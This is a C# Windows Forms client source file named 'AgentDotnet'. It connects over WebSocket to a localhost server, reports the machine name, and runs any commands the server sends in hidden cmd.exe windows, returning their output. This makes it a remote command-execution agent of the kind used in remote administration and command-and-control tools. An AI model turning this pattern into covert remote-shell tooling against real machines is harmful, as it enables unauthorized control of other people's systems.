using AgentDotnet.Models;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;
using WebSocketSharp;

namespace AgentDotnet
{
    public partial class Form1 : Form
    {
        List<AgentModel> agents = new List<AgentModel>();
        Random random = new Random();
        public delegate void labelDelegate(string wsState);
        public delegate void textboxDelegate(string wsState);
        public void SetWsState(string wsState)
        {
            Invoke(new Action(() => 
            {
                label1.Text = wsState;
                if (wsState == "Connected")
                {
                    button1.BackColor = Color.Green;
                    button1.Enabled = false;
                    button3.Enabled = true;
                }
                else if (wsState == "Disconnected")
                {
                    button1.BackColor = Color.Silver;
                    button1.Enabled = true;
                    button3.Enabled = false;
                }

            }));
        }
        //public void AppendRecMsg(string msg) => Invoke(new Action(() => textBox1.Text += msg));


        public Form1()
        {
            InitializeComponent();
        }

        

        private async void ButtonClick(object sender, EventArgs e)
        {
            Button button = (Button)sender;
            if (button.Name == button1.Name)
            {
                Connect();
            }
            else if (button.Name == button2.Name)
            {
                Send(textBox2.Text);
            }
            else if (button.Name == button3.Name)
            {
                Disconnect(null);
            }

        }
        private void Connect()
        {
            WebSocket ws = new WebSocket("ws://localhost:8080?key=abc123&name=jae");
            ws.Origin = "ws://localhost:8080";      
            ws.SetCredentials("name", "password", true); // 'true' if Basic auth
            //ws.SetCredentials("johnsmith","passwork",true);
            WebSocketEvents(ws);
            ws.Connect();
            if(ws.IsAlive)
            {
                new labelDelegate(SetWsState).DynamicInvoke("Connected"); 
            }
        }

        

        private void Send(string msg)
        {
            AgentModel agent = agents.Where(x => x.CurrentProcessId == GetCurrentInstance()).FirstOrDefault();
            if(agent == null) return;
            if(agent.Agent.IsAlive)
            {
                AgentChatModel agentChatData = new AgentChatModel
                {
                    ComType = "chat",
                    UserId = agent.UserId,
                    Message = msg,
                };
                string jsonData = JsonConvert.SerializeObject(agentChatData);
                agent.Agent.Send(jsonData);
            }  
        }

        
        private void WebSocketEvents(WebSocket ws)
        {
            ws.OnOpen += Ws_OnOpen;

            ws.OnMessage += Ws_OnMessage;

            ws.OnError += Ws_OnError;

            ws.OnClose += Ws_OnClose;
        }

        private void Ws_OnMessage(object sender, MessageEventArgs e)
        {           
            //textboxDelegate textboxDelegate = new textboxDelegate(AppendRecMsg);
            ServerCommands serverCommands = JsonConvert.DeserializeObject<ServerCommands>(e.Data);
            AgentModel agent = agents.Where(x => x.UserId == serverCommands.UserId).FirstOrDefault();
            if(agent != null)
            {
                if(agent.Agent.IsAlive)
                {
                    string[] commands = serverCommands.Commands.Split('\n');
                    string jsonCommandResult = ExecuteCommands(commands);
                    AgentChatModel agentChatData = new AgentChatModel
                    {
                        ComType = "cmd",
                        UserId = agent.UserId,
                        Message = jsonCommandResult,
                    };
                    string jsonData = JsonConvert.SerializeObject(agentChatData);
                    agent.Agent.Send(jsonData);
                }
            }
        }

        private string ExecuteCommands(string[] commands)
        {
            List<CommandsResult> commandsResult = new List<CommandsResult>();
            foreach(string command in commands)
            {
                Process cmd = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.CreateNoWindow = true;
                startInfo.RedirectStandardInput = true;
                startInfo.RedirectStandardOutput = true;
                startInfo.UseShellExecute = false;
                cmd.StartInfo = startInfo;
                cmd.Start();

                cmd.StandardInput.WriteLine(command.Trim());
                cmd.StandardInput.Flush();
                cmd.StandardInput.Close();
                cmd.WaitForExit();
                string result = cmd.StandardOutput.ReadToEnd();

                result = ExtractCmdResult(result);
                
                commandsResult.Add(new CommandsResult { Command = command.Trim(), Result = result });
            }
            return JsonConvert.SerializeObject(commandsResult);

        }
        private string ExtractCmdResult(string result)
        {
            string[] lines = result.Split(Environment.NewLine.ToCharArray()).Where(x => !string.IsNullOrEmpty(x)).ToArray();
            lines = lines.Take(lines.Length - 1).Skip(3).ToArray();
            string output = string.Join(Environment.NewLine, lines);
            return output;
        }
        private void Ws_OnOpen(object sender, EventArgs e)
        {
            labelDelegate labelDelegate = new labelDelegate(SetWsState);
            labelDelegate.DynamicInvoke("Connected");
            WebSocket ws = (WebSocket)sender;
            if (ws.IsAlive)
            {
                int currentProcessId = GetCurrentInstance();
                string userId = random.Next(100, 999).ToString();
                agents.Add(new AgentModel
                {
                    Agent = ws,
                    CurrentProcessId = currentProcessId,
                    UserId = userId,
                });
                AgentConModel clientConData = new AgentConModel
                {
                    ComType = "connection",
                    UserId = userId,
                    HostName = Environment.MachineName,
                };
                string jsonData = JsonConvert.SerializeObject(clientConData);
                ws.Send(jsonData);
            }
        }

        private void Ws_OnClose(object sender, CloseEventArgs e)
        {
            Disconnect(((WebSocket)sender));
        }

        private void Ws_OnError(object sender, ErrorEventArgs e)
        {
            MessageBox.Show("onError called");
        }

        private int GetCurrentInstance()
        {
            Process current = Process.GetCurrentProcess();
            return current.Id;
        }

        
        private void Disconnect(WebSocket ws)
        {
            AgentModel agentModel = ws == null ? agents.Where(x => x.CurrentProcessId == GetCurrentInstance()).FirstOrDefault() : agents.Where(x => x.Agent == ws).FirstOrDefault();
            if(agentModel != null)
            {
                if (agentModel.Agent.IsAlive)
                {
                    agentModel.Agent.Close();
                }
                agents.Remove(agentModel);
                new labelDelegate(SetWsState).DynamicInvoke("Disconnected");
            } 
        }

    }
}
